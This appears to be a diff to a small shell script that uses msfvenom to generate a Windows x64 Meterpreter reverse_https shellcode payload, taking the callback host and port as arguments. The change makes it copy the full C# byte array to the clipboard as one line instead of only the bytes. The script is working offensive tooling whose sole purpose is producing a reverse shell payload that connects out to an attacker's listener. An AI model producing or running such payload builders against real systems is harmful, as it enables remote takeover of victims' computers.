@@ -14,11 +14,9 @@ fi
 LHOST="$1"
 LPORT="$2"
 
-# Extract just the bytes inside {}, remove line breaks, and copy to clipboard
+# Extract the full C# shellcode and copy it to the clipboard as a single line
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$LHOST" LPORT="$LPORT" -f csharp 2>/dev/null \
-| sed -n '/{/,/}/p' \
-| sed '1s/.*{//; $s/}.*//' \
 | tr -d '\n' \
 | xclip -selection clipboard
 
-echo "[+] Payload copied to clipboard as a single-line byte string."
+echo "[+] Full C# payload copied to clipboard as a single-line string."
